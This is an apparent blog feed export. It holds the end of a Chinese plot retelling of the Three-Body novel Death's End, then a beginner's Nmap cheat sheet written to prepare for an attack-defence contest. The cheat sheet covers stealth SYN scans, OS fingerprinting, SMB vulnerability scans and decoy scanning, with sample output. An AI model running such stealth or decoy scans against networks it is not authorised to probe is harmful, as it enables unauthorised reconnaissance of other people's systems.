罗辑稍等一下，沉思过后对罗辑说道，可以，这是出于我们三体人对罗辑您的尊重，但我只能回答你，是，不是或不知道。然后，我便不会再回答二位任何问题了。罗辑丝毫没有犹豫，问出了最后一个问题。在宇宙中存不存在一种安全声明，可以避免黑暗森林打击。整个屋子寂静了很久，智子终于开口了，她说，有。</p><p>&emsp;&emsp;茶道谈话结束了，所有人都在思考如何发布安全声明。宗教总是在人们消极的时代兴旺，地球逐渐成为一个大教堂，一颗祈祷之星。由于三体人知道如何发布安全声明，三体成为了人们心中的神，智子成为了被祈祷的对象。智子的家门口，每日都有成千上万的人在此祈祷，但智子每次也只是向众人微微鞠躬，然后悄然退去。智子要离开的那一天到了，它会离开这个美丽的躯壳，飞往三体舰队。她最后一次会见了罗辑和程心，这次，三个人没说什么话，因为他们都知道，该说的都说完了。智子打破了寂静，她说，我要走了，请二位多多保重。宇宙很大，生活更大，也许以后还有缘再见。还有，程心，云天明要见你。</p><p>&emsp;&emsp;三体文明比地球文明强大太多了，人类在三体人眼里就是虫子，三体人面对虫子的威胁，表现出来的不是憋屈，不是不情愿，而是非常真诚，但又不停地群钊打破这种平衡的可能，这招用的好厉害。差点就把人类给搞定了。看来不懂计谋的三体人，跟人类打交道的这300多年里，跟着学会了不少阴招。两个文明的平衡，就握在执剑人手里，一个合格的执剑人才能保持这种平衡。可惜，想用爱拯救世界的程心不是这个人，在三体的母星被摧毁后，三体人面对自己的宿敌，表现出了得体、礼貌和成熟，没有丝毫怨恨，也没有谈论是非，仅用平淡的茶会结束了300多年的对决。</p><h3 id="死神永生-下"><a href="#死神永生-下" class="headerlink" title="死神永生 下"></a>死神永生 下</h3><p>&emsp;&emsp;智子对程心说，云天明要见你，这句话从何说起。原来，当初三体人一直关注着阶梯计划，当第一批三体舰队，因为罗辑的威胁被迫离开太阳系后，他们决定，去找装有云天明大脑的探测器作为纪念品。</p><p>&emsp;&emsp;从云天明能见程心来看，云天明在三体飞船那里混得还算不错。三体人严正声明，这只是云天明和程心两个人之间的事，双方不能提及三体文明，会面不得有第三方在场，也不能以任何形式记录，为了保证隔离性，这次会面设立在太空中。程心乘坐飞船飞到指定地点后，智子将简历远程的实时视频通讯。如果三体人发现，谈话中设计不允许提及的内容，那么，程心得飞行器将会爆炸。</p><p>&emsp;&emsp;通讯开始了，程心看到了云天明，他的身体被三体人复原了，云天明看起来很健康，很年轻。云天明告诉程心，他在三体飞船上平时除了种地消遣，就是给三体人的孩子们讲故事。这里顺带一提，由于三体文明文化的匮乏，所以三体人特别喜欢挺云天明讲故事。云天明还在那出了书，成为了三体世界知名的文学家。由于三体人已知监视着这场谈话，云天明在跟程心聊了很多家常话后，便给他讲了三个他在飞船上经常给三体人讲的故事。谈话便结束了。在最后的一分钟，程心对云天明提出了约会邀请，她说，宇宙很大，生活更大，我们还会相见的。如果有机会，就在你送给我的那颗星星上见面吧。云天明在最后一刻回答到，好，在我们的星星。</p><p>&emsp;&emsp;通讯结束。当程心返航后，被立马带进了一个小房间，这个房间是智子盲区。虽然三体人已经明确表示，智子会全部撤离地球，单位了保险起见，为了云天明的安全，需要在这里记录下谈话的内容。程心在返程中，心理不断背着云天明给她将的三个故事，因为她知道，这三个故事就是拯救地球的关键，通过长时间的解读，人们终于发现了隐藏在这三个故事中的秘密。</p><p>&emsp;&emsp;1、光速飞船的法发展方向应使用空间曲率驱动器，这种驱动器是通过影响空间，利用空间的曲率把飞船拉至光速。打个比方，就像在小纸船的船尾，装一块小香皂，船会自动向前。这是因为肥皂改变了水的张力，但船前方水面的张力不变，从而把船拉了过去。2、用一层低光速带包裹住太阳系，这就是全宇宙通用的安全生声明。这个被包裹的区域被称之为黑域，在这个黑域里，没有飞船可以飞出去，黑域是一个完全封闭的空间，在这里，人们可以获得安全，但会失去自由。3。最后一个秘密暂且不表，因为直到最后，有人才发现了它。</p><p>&emsp;&emsp;三体人彻底离开而来太阳系。不久后人们为了避免被光粒打击的灾难，开始了，掩体工程。什么是掩体工程呢？以木星、土星、天王星和海王星四大巨星为掩体，在他们的背阳面建造太空城。为什么人们不造光速飞船准备跑路呢？一方面光速飞船会在太空中留下印记，很容易被高级文明观测到；另一方面，在这个时代人权意识极强，因为只有少部分人能离开，大部分人要留下，所以制造光速飞船成为了严重的违法行为。但程心和AA知道，建造光速飞船才是人类的出路。</p><p>&emsp;&emsp;有一天，维德找到了程心，对她说，造光速飞船是一条正确的路。但你没有力量造出来，把你拥有的一切资源给我，让我来，维德随后的一句话让程心同意了。他冷静的对程心说，不要犯第二次错，思索良久后，程心答应了维德。但她有个条件，她说，当你做的事危害人类的生命时，我可以收回你的权利。维德答应了。程心和AA进入了冬眠，等待成果。接下来，程心得公司全权由维德负责。</p><p>&emsp;&emsp;掩体纪元十一年，沉睡了62年的程心被唤醒，由于多次冬眠，程心现在的实际年龄是33岁，在这个平均寿命150岁的年代里，她还是个少女。在这个纪元，形成了四个太空城群落，分别分布在木星、土星、天王星、海王星的背阳面，地球成为了太阳系联邦中的一个普通城邦。现在地球上，人烟稀少，只有五百万不怕死的人生活在那里，每个人在那生活得像国王一样，大自然重新占领了地球。很多人不愿意留在地球是因为，如果太阳系遭受光粒打击，那么地球上的人将无一幸免。程心被带到了一座叫星环城的太空城，他在这见到了一百多岁的维德。维德一直在研发光速飞船，现在已经小有成果。但就在关键时刻，由于联邦政府的反复阻挠，维德与他们撕破了脸，维德现在被政府军包围。但以维德现在的实力，他可以拼死一搏，斗个鱼死网破。但他对程心有承诺，政府唤醒程心得原因，就是希望她可以权维德放下武器。经过维德六十年的努力，曲率驱动器已经研制的差不多了，是否能够继续，就看程心一句话。程心现在想，如果战斗开始，成千上万人会死于非命，善良的程心对维德说吗，你的诺言还有效吗？维德点了点头，程心说道，好，立刻停止一切。维德近乎恳请的说到，再考虑一下吧，程心坚定的说，不需要考虑。维德无助的说到，失去人性，失去很多；失去兽性，失去一切。程心果断的回答道，我选择人性。</p><p>&emsp;&emsp;现场寂静了，维德让众人放下武器，准备投降。维德心中勇往直前的火焰熄灭了。他微笑的对程心说，小女孩，你看我遵守了诺言。不久后，被捕的维德被处以死刑。程心想到未来，去看太阳系被打击后的世界。便再次进入了冬眠。</p><p>&emsp;&emsp;掩体纪元六十七年。此时一艘太空飞船发现了太阳系。这艘飞船主要的任务，就是藏好自己并清理他们发现的低级文明。其中，有一个被称为歌者的底层工作人员，向领导申请了一片叫二向箔的武器，漫不经心的将它仍忘了太阳系。</p><p>&emsp;&emsp;在太空城内，程心和AA都被唤醒了。黑暗森林打击终于降临了，没有人向掩体逃跑，因为太阳系并没有遭到光粒打击，而是受到了一片小纸条。人们通过引力波找到了这张没有厚度，只有一张信用卡代销的白色纸条。过了一段时间，这张小纸条突然越来越大，所有接触他的物体，都遭到了降维打击。从三维降到二维，成了一张画。在俄二向箔周围的飞船准备逃离，但他们发现，只有光速才能逃离二向箔的引力。以这张纸条变大的速度，八到十天后，整个太阳系都将变成一张没有厚度的画。这就是云天明在故事里，最后隐藏的秘密。降维打击。</p><p>&emsp;&emsp;人类多年来，殚精竭虑的在太阳系布置掩体城市，但人类知道掩体，难道那些拥有更高级明文的外星人就不知道吗？弱小和无知不是生存的障碍，傲慢才是。</p><p>&emsp;&emsp;程心和AA在冥王星上的太空博物馆里，找到了快两百岁的罗辑，三人寒暄了一阵后，开始将一些名画运到了飞船上。他们不希望这一些画同博物馆一同二维化。因为那样，未来到访的外星人可能就解读不了人类曾经的文化瑰宝了。罗辑自己留下了一幅画，这幅画就是蒙娜丽莎，他年轻时曾在这幅画面前，与一人陷入爱河。</p><p>&emsp;&emsp;罗辑催促他们尽快上飞船把画运到外面，他自己决定留在这个博物馆里，和蒙娜丽莎一起看着太阳系被二维化。其实，程心他们乘坐的这艘飞船大有来历，这艘飞船名叫星环号，不仅使用了些跟水滴一样坚固的材料，还装备了完整的生态系统和常规引擎，此外，还拥有曲率驱动引擎可进行光速航行。这艘飞船，是太阳系唯一一艘光速飞船。这是怎么回事呢？</p><p>&emsp;&emsp;罗辑通过远程视频通讯，告诉了一直蒙在鼓里程心和AA。原来，维德死后，残余的力量并没有放弃。曾经面壁者雷迪亚兹在水星上做爆炸试验，把水星炸了个大坑。为了隐蔽，维德的余党就把基地设立在了这里，他们对外表示在研究太阳活动。后来联邦政府介入，并一起悄悄地研究光速飞船。星环上安装的引擎就是第一代试验品。只有少数年迈的元老知道这件事，其中，就包括罗辑。</p><p>&emsp;&emsp;程心想回去接罗辑，但飞船不听程心的。因为罗辑，拥有这艘飞船的最高指挥权。罗辑笑了笑说，我这样岁数的人不适合远航，孩子们不要为我操心了，我什么都没有失去。罗辑命令星环号进入光速航行到太阳系以外。飞船开始启动，船后的空间开始畸变。</p><p>&emsp;&emsp;很多人乘坐着常规推动器的飞船，想逃出太阳系。但那是不可能的。但他们看到星环号后面的空间正在畸变时，这些人发现，这是一艘正在加速的光速飞船。于是，这些近乎疯狂的人，有的要去拦截，有的要去击毁，有的要去劫持。但星环号非常的坚固，这些人想把飞船刮破一点皮儿都难。如果当初程心没有组织维德，耽误了那宝贵的时间，光速飞船是个可以批量生产的。但现在，一切都晚了。程心从逻辑的眼神中读出了一句话，孩子，看看你都干了些什么呀。</p><p>&emsp;&emsp;程心现在明白了，什么掩体，什么安全声明，只有光速飞船才是活路。云天明指出了这条路，而程心却把它堵死了。程心到头来，还是犯了第二次错误。程心开始恨维德，为什么要履行承诺。在通话的最后一刻，罗辑说，我要进画里了，孩子们走好。</p><p>&emsp;&emsp;飞船要进入光速了，程心突然想到自己还有个约会。程心说，去我们的星星。于是，太阳系仅存的两个女人，给忘了云天明送给程心的星星。一段时间后，星环号到了这颗恒星，并在一颗蓝色的行星上降落了。在这颗蓝星上有一个帅气的男人在迎接他们。这个人，名叫关一帆。是万有引力号上的研究员，五年前才在冬眠中被唤醒。他收到了星环号的引力波信号，所以留在这等她们。从这个人的口中，二人得知，到头的万有引力号和蓝色空间号上的人，成功创建了四个世界，并且还在扩张中。这颗蓝星上，没有高等生命，像是原始的地球。他们三人在这待了一段时间。</p><p>&emsp;&emsp;有一天，关一帆发现，临近的另一颗灰色行星上有飞船的踪迹。关一帆要去前往查看，程心要跟着，因为她想这可能和云天明有关。AA留在蓝星等着他们回来。二人乘坐关一帆的亨利号，前往灰星。在飞船上，关一帆高速程心，宇宙中最可怕的武器就是，宇宙规律。二向箔就是其中之一。二向箔在高等文明那很常用，它一旦展开就会无限扩张，所以，总有一天，整个宇宙也会二维化。宇宙正在死去，一些大神级文明，他们已经在研究，如何将自己二维化后，能继续活在二维世界里。大概在一百多亿年前，宇宙起码有十维。经过不断地星际战争，宇宙才变成先进的三维。有一批大神级文明，他们在努力使宇宙重启。</p><p>&emsp;&emsp;航行了几天，飞船抵达了灰星，在那里，他们没有找到云天明，而是看见了高等外星文明留下的死线。死线极其的黑，任何东西进去，都出不来，连光也一样。死线随时会破裂，破裂后的死线会形成低光速带，成为黑域。在这片区域里，光会变得非常慢。关一帆看到这一场景，连忙带着程心飞回蓝星，在返回的过程中，亨利号收到了AA的通讯，AA激动地告诉程心，云天明来了，现在就在蓝星上，我去找他过来和你说话。为了保证通讯安全，不被周围的外星人发现。不用了，我们马上就回去，随机关掉了通讯。正当程心他们要回到蓝星时，突然死线破裂，他俩进入了时间真空。十六天后，程心和关一帆，才脱离了黑域，回到了蓝星。在时间真空里虽然只过了16天，但此时，蓝星上已经过了一千八百九十万年。</p><p>&emsp;&emsp;程心很难过。因为她永远错过了云天明。二人用探测器发现了刻在石头上巨大无比的几个字，上面写着，我们度过了幸福的一生。我们送给你们一个小宇宙，在里面躲过坍缩，去新的世界。</p><p>&emsp;&emsp;他们发现了这个小礼物，这是一个由微亮细线画出来的门，两人牵着手，一同进入了这扇门。这里是一个一立方千米的循环空间，如果你从头跑到尾，你会发现，自己又回到了起点。在这个空间里，有一片美丽的田园。生活用品，一应俱全。这篇小天地就是云天明送给程心的第二件礼物，一个小宇宙。程心在这里看见了老朋友，智子。她用的躯壳还是跟地球上的外形一样。智子，是这里的管家，智子对程心说，宇宙很大，生活更大，我们真的又相会了。</p><p>&emsp;&emsp;智子告诉他们，这里是云天明送给二位的礼物，在这，时间会过得非常慢，只需在这待上十年，外面的宇宙，就会重启。程心和关一帆在这开始了甜蜜的生活，智子成为了他俩的老师。教他们三体里的知识，生活了许久后，他们收到了一个大神级文明向全宇宙广播的信号，这个信号包含了百万种语言，都是大神级文明，认为值得被通知的外星文明。在这信息中，他们发现了人类和三体人的语言。内容大致如下，请把你们制造的小宇宙归还到大宇宙中，大宇宙因为你们偷走的质量，将会在膨胀中死去。归还小宇宙，意味着在里面的居住者要回到大宇宙中。程心和关一帆决定归还小宇宙返回大宇宙中。</p><p>&emsp;&emsp;智子开始负责归还小宇宙，在这个小宇宙的底下，藏有一艘小型飞船，这艘飞船浓缩了三体世界最先进的技术。程心没有把这个小宇宙全部归还，她在这留下了五公斤。留下了一个生态球，里面养着小鱼。她希望，这个空间里还能有生命存在。智子对两位朋友说到，放心，我在，你们就在。随后，飞船启动，飞向了未知的大宇宙。</p><p>&emsp;&emsp;三体系列的整个故事，到此结束了。程心这一辈子，都在攀登一道责任的阶梯，小时候的她责任是好好学习，不让爸妈失望，努力成为一个优秀的人。长大后，她要为工作负责，为阶梯计划负责。后来云天明送个她的一颗星星。促使她成为了执剑人，这时的她要为全人类负责。后来她的责任变得复杂起来，本来她想给人插上光速飞行的翅膀，却不得不制止。最后她要为整个宇宙负责，归还属于自己的小宇宙。</p><p>&emsp;&emsp;人类，在面对即将到来的黑暗森林打击时，由于受到道德枷锁的限制，做出了很多决策失误，导致太阳系不复存在。只有程心与AA从太阳系逃出。三体系列的整个故事，告诉了我们一个真理。在浩瀚的宇宙中，永恒的只有死神。</p><h2 id="原视频链接"><a href="#原视频链接" class="headerlink" title="原视频链接:"></a>原视频链接:</h2><p><a href="https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080" target="_blank" rel="noopener">https://www.weibo.com/tv/v/HFze2EH9A?fid=1034:4399060850003080</a></p>]]></content>
      
      
      <categories>
          
          <category> 小书屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> book </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初遇Nmap</title>
      <link href="/2019/07/22/nmap/"/>
      <url>/2019/07/22/nmap/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>后天要参加人生第一次awd线下攻防了，今天赶紧突击一下，先学习一下nmap的一些常规操作</p><h3 id="引入："><a href="#引入：" class="headerlink" title="引入："></a>引入：</h3><p><strong>1) 获取远程主机的系统类型及开放端口</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">nmap</span> -sS -P0 -sV -O <span class="symbol">&lt;target&gt;</span></span><br></pre></td></tr></table></figure><p>这里的 &lt; target &gt; 可以是单一 IP, 或主机名，或域名，或子网</p><p>-sS TCP SYN 扫描 (又称半开放,或隐身扫描)<br>-P0 允许你关闭 ICMP pings.<br>-sV 打开系统版本检测<br>-O 尝试识别远程操作系统</p><p>其它选项:</p><p>-A 同时打开操作系统指纹和版本检测<br>-v 详细输出扫描情况.</p><p><strong>2) 列出开放了指定端口的主机列表</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -p <span class="number">80</span> -oG – <span class="number">192.168</span><span class="number">.1</span>.* | grep open</span><br></pre></td></tr></table></figure><p><strong>3) 在网络寻找所有在线主机</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sP</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span>.*</span><br></pre></td></tr></table></figure><p>或者也可用以下命令:</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><p>指定 subnet</p><p><strong>4) Ping 指定范围内的 IP 地址</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP <span class="number">192.168</span><span class="number">.1</span><span class="number">.100</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>5) 在某段子网上查找未占用的 IP</strong></p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-T4</span> <span class="selector-tag">-sP</span> <span class="selector-tag">192</span><span class="selector-class">.168</span><span class="selector-class">.2</span><span class="selector-class">.0</span>/<span class="selector-tag">24</span> <span class="selector-tag">&amp;</span><span class="selector-tag">&amp;</span> <span class="selector-tag">egrep</span> “<span class="selector-tag">00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span><span class="selector-pseudo">:00</span>″ /<span class="selector-tag">proc</span>/<span class="selector-tag">net</span>/<span class="selector-tag">arp</span></span><br></pre></td></tr></table></figure><p><strong>6) 在局域网上扫找 Conficker 蠕虫病毒</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -PN -T4 -p139,<span class="number">445</span> -n -v –script=smb-check-vulns –script-args safe=<span class="number">1</span> <span class="number">192.168</span><span class="number">.0</span><span class="number">.1</span><span class="number">-254</span></span><br></pre></td></tr></table></figure><p><strong>7) 扫描网络上的恶意接入点 （rogue APs）.</strong></p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p1<span class="number">-85</span>,<span class="number">113</span>,<span class="number">443</span>,<span class="number">8080</span><span class="number">-8100</span> -T4 –min-hostgroup <span class="number">50</span> –max-rtt-timeout</span><br><span class="line"><span class="number">2000</span> –initial-rtt-timeout <span class="number">300</span> –max-retries <span class="number">3</span> –host-timeout <span class="number">20</span>m</span><br><span class="line">–max-scan-delay <span class="number">1000</span> -oA wapscan <span class="number">10.0</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">8</span></span><br></pre></td></tr></table></figure><p><strong>8 ) 使用诱饵扫描方法来扫描主机端口</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">sudo</span> <span class="selector-tag">nmap</span> <span class="selector-tag">-sS</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.10</span> <span class="selector-tag">-D</span> 192<span class="selector-class">.168</span><span class="selector-class">.0</span><span class="selector-class">.2</span></span><br></pre></td></tr></table></figure><p><strong>9) 为一个子网列出反向DNS记录</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -R -sL <span class="number">209.85</span>.<span class="number">229.99</span>/<span class="number">27</span> | awk ‘&#123;<span class="keyword">if</span>($3==”<span class="keyword">not</span>”)<span class="keyword">print</span>”(“$2″) <span class="keyword">no</span> PTR”;<span class="keyword">else</span> <span class="keyword">print</span>$3″ is “$2&#125;’ | <span class="keyword">grep</span> ‘(‘</span><br></pre></td></tr></table></figure><p><strong>10) 显示网络上共有多少台 Linux 及 Win 设备?</strong></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -F -O <span class="number">192.168</span>.<span class="number">0.1</span>-<span class="number">255</span> | <span class="keyword">grep</span> “Running: ” &gt; <span class="regexp">/tmp/</span>os; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Linux \</span><br><span class="line">| wc -l) Linux device(s)”; echo “$(cat <span class="regexp">/tmp/</span>os | <span class="keyword">grep</span> Windows | wc -l) Window(s) device”</span><br></pre></td></tr></table></figure><p>### </p><h3 id="1-用主机名和IP地址扫描系统"><a href="#1-用主机名和IP地址扫描系统" class="headerlink" title="1. 用主机名和IP地址扫描系统"></a>1. 用主机名和IP地址扫描系统</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> server2.tecmint.<span class="keyword">com</span>（<span class="number">192.168</span>.<span class="number">0.101</span>）</span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">42</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.415</span> seconds</span><br><span class="line">You have <span class="keyword">new</span> mail in /var/spool/mail/root</span><br></pre></td></tr></table></figure><h3 id="2-扫描使用“-v”选项"><a href="#2-扫描使用“-v”选项" class="headerlink" title="2.扫描使用“-v”选项"></a>2.扫描使用“-v”选项</h3><p>你可以看到下面的命令使用“ <strong>-</strong>v “选项后给出了远程机器更详细的信息。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> -v server2.tecmint.<span class="keyword">com</span></span><br><span class="line"> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">15</span>:<span class="number">43</span> EST</span><br><span class="line">Initiating ARP Ping Scan against <span class="number">192.168</span>.<span class="number">0.101</span> [<span class="number">1</span> port] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">The ARP Ping Scan took <span class="number">0.01</span>s <span class="keyword">to</span> scan <span class="number">1</span> total hosts.</span><br><span class="line">Initiating SYN Stealth Scan against server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) [<span class="number">1680</span> ports] at <span class="number">15</span>:<span class="number">43</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">22</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">80</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">8888</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">111</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">3306</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">Discovered <span class="keyword">open</span> port <span class="number">957</span>/tcp <span class="keyword">on</span> <span class="number">192.168</span>.<span class="number">0.101</span></span><br><span class="line">The SYN Stealth Scan took <span class="number">0.30</span>s <span class="keyword">to</span> scan <span class="number">1680</span> total ports.</span><br><span class="line">Host server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>) appears <span class="keyword">to</span> <span class="keyword">be</span> <span class="keyword">up</span> ... good.</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line"> </span><br><span class="line">Nmap finished: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.485</span> seconds</span><br><span class="line">               Raw packets sen<span class="variable">t:</span> <span class="number">1681</span> (<span class="number">73.962</span>KB) | Rcvd: <span class="number">1681</span> (<span class="number">77.322</span>KB)</span><br></pre></td></tr></table></figure><h3 id="3-扫描多台主机"><a href="#3-扫描多台主机" class="headerlink" title="3.扫描多台主机"></a>3.扫描多台主机</h3><p>你可以简单的在Nmap命令后加上多个IP地址或主机名来扫描多台主机。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@server1 ~]# <span class="keyword">nmap</span> <span class="number">192.168</span>.<span class="number">0.101</span> <span class="number">192.168</span>.<span class="number">0.102</span> <span class="number">192.168</span>.<span class="number">0.103</span> </span><br><span class="line">Starting Nmap <span class="number">4.11</span> ( http://www.insecure.org/<span class="keyword">nmap</span>/ ) at <span class="number">2013</span>-<span class="number">11</span>-<span class="number">11</span> <span class="number">16</span>:<span class="number">06</span> EST</span><br><span class="line">Interesting ports <span class="keyword">on</span> server2.tecmint.<span class="keyword">com</span> (<span class="number">192.168</span>.<span class="number">0.101</span>):</span><br><span class="line">Not shown: <span class="number">1674</span> closed ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp   <span class="keyword">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp   <span class="keyword">open</span>  http</span><br><span class="line"><span class="number">111</span>/tcp  <span class="keyword">open</span>  rpcbind</span><br><span class="line"><span class="number">957</span>/tcp  <span class="keyword">open</span>  unknown</span><br><span class="line"><span class="number">3306</span>/tcp <span class="keyword">open</span>  mysql</span><br><span class="line"><span class="number">8888</span>/tcp <span class="keyword">open</span>  <span class="keyword">sun</span>-answerbook</span><br><span class="line">MAC Addres<span class="variable">s:</span> <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:D9:<span class="number">8</span>E:D7 (Cadmus Computer Systems)</span><br><span class="line">Nmap finished: <span class="number">3</span> IP addresses (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">0.580</span> seconds</span><br></pre></td></tr></table></figure><h3 id="4-扫描整个子网"><a href="#4-扫描整个子网" class="headerlink" title="4.扫描整个子网 *"></a>4.扫描整个子网 *</h3><p>你可以使用*通配符来扫描整个子网或某个范围的IP地址。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 